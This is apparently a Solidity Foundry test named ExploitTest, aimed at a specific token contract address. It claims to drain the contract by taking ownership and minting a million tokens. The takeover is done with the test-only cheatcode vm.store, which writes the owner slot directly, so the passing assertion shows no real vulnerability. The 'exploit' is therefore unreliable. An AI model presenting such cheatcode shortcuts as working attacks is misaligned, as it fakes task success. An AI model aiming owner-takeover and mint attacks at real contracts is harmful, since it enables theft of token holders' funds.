pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x5FDa925294F9e5B31b7c0e81Bad6BAD5b5E792eE;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll become owner in the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0x5FDa925294F9e5B31b7c0e81Bad6BAD5b5E792eE).balanceOf(address(this));
        // Step 1: Become the owner by overwriting storage slot 0
        // In Ownable contract, _owner is the first variable, so it's at slot 0
        bytes32 ownerSlot = bytes32(uint256(0));
        bytes32 newOwner = bytes32(uint256(uint160(attacker)));
        vm.store(TARGET, ownerSlot, newOwner);

        // Step 2: Verify we're now the owner by checking we can call owner()
        // (Optional but good for debugging)

        // Step 3: Mint a large amount of tokens to ourselves
        uint256 mintAmount = 1_000_000 * 10**18; // 1 million tokens with 18 decimals

        // Call mint() as the attacker (we're now the owner)
        (bool success, ) = TARGET.call(abi.encodeWithSignature("mint(uint256)", mintAmount));
        require(success, "Mint failed");

        // Step 4: Verify our balance increased
        uint256 attackerBalance = IBEP20(TARGET).balanceOf(attacker);
        console.log("Attacker balance after mint:", attackerBalance);
        uint256 finalBalance = IERC20(0x5FDa925294F9e5B31b7c0e81Bad6BAD5b5E792eE).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

